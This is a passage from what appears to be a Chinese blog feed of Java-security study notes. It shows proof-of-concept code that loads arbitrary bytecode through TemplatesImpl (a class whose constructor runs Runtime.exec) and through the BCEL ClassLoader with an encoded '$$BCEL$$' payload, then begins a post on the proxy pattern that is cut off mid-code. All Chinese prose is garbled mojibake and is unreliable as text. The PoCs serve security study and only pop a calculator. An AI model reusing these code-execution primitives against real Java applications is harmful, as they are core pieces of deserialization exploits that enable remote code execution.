ç±»å‹å˜æˆäº†ä¸€ä¸ª default ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</li></ul><p>æˆ‘ä»¬ä» <code>TransletClassLoader#defineClass()</code> å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><p>æˆ‘è¿™é‡Œæ˜¯é€šè¿‡å…¨å±€æœç´¢å…³é”®å­—å¯»æ‰¾æ–¹æ³•è°ƒç”¨å…³ç³»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br><br>TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()<br><br>-&gt; TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>è¿½åˆ°æœ€å‰é¢ä¸¤ä¸ªæ–¹æ³• <code>TemplatesImpl#getOutputProperties()</code> å’Œ <code>TemplatesImpl#newTransformer()</code> ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯publicï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬å°è¯•ç”¨ <code>TemplatesImpl#newTransformer()</code> æ„é€ ä¸€ä¸ªç®€å•çš„ POC</p><p>é¦–å…ˆå…ˆæ„é€ å­—èŠ‚ç ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„å­—èŠ‚ç å¿…é¡»ç»§æ‰¿<code>AbstractTranslet</code>ï¼Œå› ä¸ºç»§æ‰¿äº†è¿™ä¸€æŠ½è±¡ç±»ï¼Œæ‰€ä»¥å¿…é¡»è¦é‡å†™ä¸€ä¸‹é‡Œé¢çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.TemplatesImplClassLoader;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// TemplatesImpl çš„å­—èŠ‚ç æ„é€   </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesBytes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesBytes</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;  <br>        <span class="hljs-built_in">super</span>();  <br> Runtime.getRuntime().exec(<span class="hljs-string">&quot;Calc&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆclassæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -<span class="hljs-built_in">source</span> 8 -target 8 TemplatesBytes.java<br></code></pre></td></tr></table></figure><p>ç¼–å†™poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.TemplatesImplClassLoader;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br>  <br><span class="hljs-comment">// ä¸»ç¨‹åº  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Calc.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>setFieldValueæ–¹æ³•ä¼ å…¥çš„å‚æ•°ä¸é“¾å­é—´æ–¹æ³•è°ƒç”¨çš„æ¡ä»¶æœ‰å…³</p><ol><li>getTransletInstance()éœ€è¦_nameä¸ä¸ºç©º</li></ol><p><img src="/img/java%E5%AE%89%E5%85%A8/a41.png"></p><ol start="2"><li><p>_ bytecodesè¦åŒ…å«æœ‰æ•ˆçš„ç±»å­—èŠ‚ç æ–‡ä»¶å†…å®¹ï¼Œ_tfactoryå¿…é¡»è®¾ç½®æœ‰æ•ˆçš„å·¥å‚å®ä¾‹</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a42.png"></p></li></ol><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a43.png"></p><h3 id="åˆ©ç”¨-BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç </h3><ul><li>ä»€ä¹ˆæ˜¯ BCELï¼Ÿ</li></ul><p>BCEL çš„å…¨ååº”è¯¥æ˜¯ Apache Commons BCELï¼Œå±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä½†å…¶å› ä¸ºè¢« Apache Xalan æ‰€ä½¿ç”¨ï¼Œè€Œ Apache Xalan åˆæ˜¯ Java å†…éƒ¨å¯¹äº JAXP çš„å®ç°ï¼Œæ‰€ä»¥ BCEL ä¹Ÿè¢«åŒ…å«åœ¨äº† JDK çš„åŸç”Ÿåº“ä¸­ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ BCEL æä¾›çš„ä¸¤ä¸ªç±» <code>Repository</code> å’Œ <code>Utility</code> æ¥åˆ©ç”¨ï¼š <code>Repository</code> ç”¨äºå°†ä¸€ä¸ªJava Class å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javacå‘½ä»¤æ¥ç¼–è¯‘ java æ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼› <code>Utility</code> ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š</p><p>æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰å†™è¿‡çš„ <code>Calc.java</code> è¿™ä¸ªç±»ã€‚</p><p>ç¼–å†™POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.BCEL;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-comment">// åˆ©ç”¨ BCEL ClassLoader åŠ è½½å­—èŠ‚ç </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELClassLoaderRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">javaClass</span> <span class="hljs-operator">=</span> Repository.lookupClass(calc);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(javaClass.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a44.png"></p><p>è¿™ä¸€å †ç‰¹æ®Šçš„ä»£ç ï¼ŒBCEL ClassLoader æ­£æ˜¯ç”¨äºåŠ è½½è¿™ä¸²ç‰¹æ®Šçš„â€œå­—èŠ‚ç â€ï¼Œå¹¶å¯ä»¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ POC</p><ul><li>æ³¨æ„è¿™é‡Œçš„ ClassLoader åŒ…ä¸è¦å¯¼é”™äº†ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.BCEL;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  <br>  <br><span class="hljs-comment">// ä¿®æ”¹è¿‡æ»¤ä¹±ç   </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELSuccessRce</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-string">&quot;$l$8b$I$A$A$A$A$A$A$A$8dQMO$db$40$Q$7d$9b8$b1c$i$C$81$f0$d1$PhK$81$QU$f5$a57$Q$97$ARU$D$V$Bz$de$y$ab$b0$d4$b1$p$7b$83$e0$X$f5$cc$85$o$O$fd$B$fc$u$c4$ecBi$a4$f6PK$9e$f1$7b3$f3$e6$ad$f7$ee$fe$f6$X$80OX$f1$e1a$d6$c7$i$e6$3d$bc0$f9$a5$8bW$3eJx$edb$c1$c5$oCyC$rJo2$U$9bk$c7$MN$3b$3d$91$M$b5H$rro$d8$ef$ca$ec$90wcb$eaQ$wx$7c$cc3e$f0$T$e9$e8S$953$7c$88$f2L$84$5b$97$J$ef$x$d1$8ey$9eG$v$3f$91Yxt$Q$8d$c26$8f$c5$3a$83$b7$n$e2$a7$a5$8cD$g$d1$Z$3f$e7$a1J$c3$cf$fb$db$XB$O$b4J$Tj$abv4$X$dfw$f9$c0$$$p$df$M$7e$t$jfB$ee$u$b3$bcb$e4$3e$9a$d9$A$V$f8$$$de$Ex$8bw$e4$8a$8c$8a$AKx$cf0$f5$P$ed$A$cb$f0$ZZ$ffo$9aa$c2$ea$c4$3c$e9$85$fb$dd3$v4$c3$e4$l$ea$60$98h$d5$tO$7eO$eag$d0h$aeE$7f$f5$d0$c1$iy$nIr$b59R$ed$e8L$r$bd$f5$d1$81$afY$wd$9e$d3$40m$40Em$7f$c7a$c6$85$a4c$bat$b1$e6$v$80$99$c3S$i$p$URf$94K$ad$9f$60W$b6$iP$y$5b$b2$8c$w$c5$e0$b1$B$e3$a8Q$f60$f1$3c$cc$ad$YP$bfA$a1$5e$bc$86$f3$ed$H$bc$_$adk$94$af$y_$a1$d9$S$8aVq$86$be$Mc$b8$80$U$aa$a40I$f1$f7$86$w$i$c2uBS$f4$ba$uD$$$a6$j$w4$ac$a9$99$H$X$f0$df$84$a2$C$A$A&quot;</span>).newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸Š <code>$$BCEL$$</code> å‘¢ï¼Ÿè¿™é‡Œå¼•ç”¨ä¸€ä¸‹pç¥çš„è§£é‡Š</p><blockquote><p>BCEL è¿™ä¸ªåŒ…ä¸­æœ‰ä¸ªæœ‰è¶£çš„ç±»<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ï¼Œä»–æ˜¯ä¸€ä¸ª ClassLoaderï¼Œä½†æ˜¯ä»–é‡å†™äº† Java å†…ç½®çš„<code>ClassLoader#loadClass()</code>æ–¹æ³•ã€‚</p><p>åœ¨ <code>ClassLoader#loadClass()</code> ä¸­ï¼Œå…¶ä¼šåˆ¤æ–­ç±»åæ˜¯å¦æ˜¯ <code>$$BCEL$$</code> å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°†ä¼šå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œ decode</p></blockquote><p>è¿è¡Œè¿™æ®µä»£ç ä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ¤æ–­è¿™æ®µä¹±ç åº”è¯¥å°±æ˜¯Calcç±»BCELæ ¼å¼çš„å­—èŠ‚ç </p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘ä»¬çŸ¥é“åŠ è½½classæ–‡ä»¶çš„å…¶ä¸­ä¸€æ®µæµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">URLClassLoader.loadClass()<br>    â†“<br>findClass()<br>    â†“<br>URLClassPath -&gt; æ‰“å¼€ URLï¼ˆfile/http/ftpï¼‰<br>    â†“<br>è¯»å–å­—èŠ‚ç <br>    â†“<br>ClassLoader.defineClass() (native)<br>    â†“<br>å¾—åˆ° JVM å†…éƒ¨ Class å¯¹è±¡<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæƒ³è¦åŠ è½½å­—èŠ‚ç ï¼Œä»æµç¨‹ä¸­å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªå…¥å£ç‚¹</p><ol><li><p>findClass()</p><p>åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹ class æ–‡ä»¶å°±æ˜¯åˆ©ç”¨æ­¤å‡½æ•°åŠ è½½è¿œç¨‹æ–‡ä»¶</p></li><li><p>defineClass() </p><p>åˆ©ç”¨ä¸åŒç±»ä¸­çš„æ­¤æ–¹æ³•åŠ è½½å­—èŠ‚ç </p></li></ol><p>å¦å¤–ä¸€ç§æ¯”è¾ƒç‰¹æ®Šçš„å…¶å®æ˜¯ä»loadClass()å…¥æ‰‹ï¼Œè½¬æ¢å­—èŠ‚ç æ ¼å¼åŠ è½½å­—èŠ‚ç ï¼Œä¸å‰ä¸¤ç§çš„å‡ºå‘ç‚¹ä¸åŒ</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>æœ¬æ–‡å†…å®¹åŸºæœ¬å…¨éƒ¨å‡ºè‡ª<a href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#7-%E5%88%A9%E7%94%A8-BCEL-ClassLoader-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-05-ç±»çš„åŠ¨æ€åŠ è½½ | Drunkbabyâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-JDKåŠ¨æ€ä»£ç†</title>
    <link href="/2025/08/27/Java%E5%AE%89%E5%85%A8-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2025/08/27/Java%E5%AE%89%E5%85%A8-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-JDKåŠ¨æ€ä»£ç†"><a href="#Javaå®‰å…¨-JDKåŠ¨æ€ä»£ç†" class="headerlink" title="Javaå®‰å…¨-JDKåŠ¨æ€ä»£ç†"></a>Javaå®‰å…¨-JDKåŠ¨æ€ä»£ç†</h1><h2 id="Javaçš„ä»£ç†æ¨¡å¼"><a href="#Javaçš„ä»£ç†æ¨¡å¼" class="headerlink" title="Javaçš„ä»£ç†æ¨¡å¼"></a>Javaçš„ä»£ç†æ¨¡å¼</h2><p>å®šä¹‰ï¼šä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®</p><p><img src="https://pic4.zhimg.com/v2-9ebf1cd2183e699d766ddf9b7296e1ed_1440w.jpg"></p><p>ä»£ç†æ¨¡å¼çš„é€šç”¨ç±»å›¾</p><p>ä¸Šå›¾ä¸­ï¼ŒSubjectæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»æˆ–è€…æ¥å£ï¼ŒRealSubjectæ˜¯å®ç°æ–¹æ³•ç±»ï¼Œå…·ä½“çš„ä¸šåŠ¡æ‰§è¡Œï¼ŒProxyåˆ™æ˜¯RealSubjectçš„ä»£ç†ï¼Œç›´æ¥å’Œclientæ¥è§¦çš„ã€‚</p><p>ä»£ç†æ¨¡å¼å¯ä»¥åœ¨ä¸ä¿®æ”¹è¢«ä»£ç†å¯¹è±¡çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡æ‰©å±•ä»£ç†ç±»ï¼Œè¿›è¡Œä¸€äº›åŠŸèƒ½çš„é™„åŠ ä¸å¢å¼ºã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä»£ç†ç±»å’Œè¢«ä»£ç†ç±»åº”è¯¥å…±åŒå®ç°ä¸€ä¸ªæ¥å£ï¼Œæˆ–è€…æ˜¯å…±åŒç»§æ‰¿æŸä¸ªç±»ã€‚</p><h3 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h3><h4 id="ç®€å•ç†è§£é™æ€ä»£ç†"><a href="#ç®€å•ç†è§£é™æ€ä»£ç†" class="headerlink" title="ç®€å•ç†è§£é™æ€ä»£ç†"></a>ç®€å•ç†è§£é™æ€ä»£ç†</h4><ul><li>ä»¥ç§Ÿå®¢æ‰¾<strong>ä¸­ä»‹</strong>å‘æˆ¿ä¸œç§Ÿæˆ¿å­ä¸ºä¾‹</li></ul><p>æƒ³è¦å®ç°<strong>ç§Ÿå®¢æ‰¾ä¸­ä»‹ç§Ÿæˆ¿ä¸œ</strong>ï¼Œåœ¨ Java ä¸­å°±éœ€è¦4ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯æˆ¿æºã€æˆ¿ä¸œã€ä¸­ä»‹ã€ç§Ÿå®¢ï¼Œå…¶ä¸­æˆ¿æºåº”è¯¥æ˜¯æ¥å£ï¼Œå…¶ä½™ä¸‰é¡¹ä¸ºç±»ã€‚</p><ul><li><code>Rent.java</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥æŠ½è±¡çš„ç†è§£ä¸ºæˆ¿æºï¼Œä½œä¸ºæˆ¿æºï¼Œå®ƒæœ‰ä¸€ä¸ªæ–¹æ³• <code>rent()</code> ä¸º<strong>ç§Ÿæˆ¿</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// ç§Ÿæˆ¿çš„æ¥å£  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Host.java</code>ï¼šè¿™æ˜¯ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å°±æ˜¯æˆ¿ä¸œï¼Œä½œä¸ºæˆ¿ä¸œï¼Œä»–éœ€è¦å®ç° <code>Rent.java</code> è¿™ä¸€ä¸ªæ¥å£ï¼Œå¹¶ä¸”è¦å®ç°æ¥å£çš„ <code>rent()</code> æ–¹æ³•ã€‚å¯¹åº”çš„æ˜¯æ–¹æ³•å®ç°ç±»</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>Client.java</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯åŠ¨ç±»ï¼Œè¿™ä¸ªç±»å…¶å®å°±æ˜¯ç§Ÿå®¢ï¼Œç§Ÿå®¢çš„æƒ³æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æ‰¾åˆ°ä¸­ä»‹ï¼Œç„¶åç§Ÿæˆ¿</p></li><li><p><code>Proxy.java</code>ï¼šè¿™æ˜¯ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»æ˜¯ä¸­ä»‹ï¼Œä¹Ÿå°±æ˜¯ä»£ç†ï¼Œä»–éœ€è¦æœ‰æˆ¿ä¸œçš„æˆ¿æºï¼Œç„¶è€Œæˆ‘ä»¬é€šå¸¸ä¸ä¼šç»§æ‰¿æˆ¿ä¸œï¼Œè€Œä¼šå°†æˆ¿ä¸œä½œä¸ºä¸€ä¸ªç§æœ‰çš„å±æ€§ <code>host</code>ï¼Œæˆ‘ä»¬é€šè¿‡ <code>host.rent()</code> æ¥å®ç°ç§Ÿæˆ¿çš„æ–¹æ³•ã€‚</p><p>Proxyåˆ™æ˜¯RealSubjectçš„ä»£ç†ï¼Œç›´æ¥å’Œclientæ¥è§¦çš„ã€‚</p><p><strong>Proxy.java</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// ä¸­ä»‹  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> Host host;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.host = host;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        host.rent();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Client.java</strong> ç§Ÿå®¢å»æ‰¾ä¸­ä»‹çœ‹æˆ¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// å¯åŠ¨å™¨  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();  <br> <span 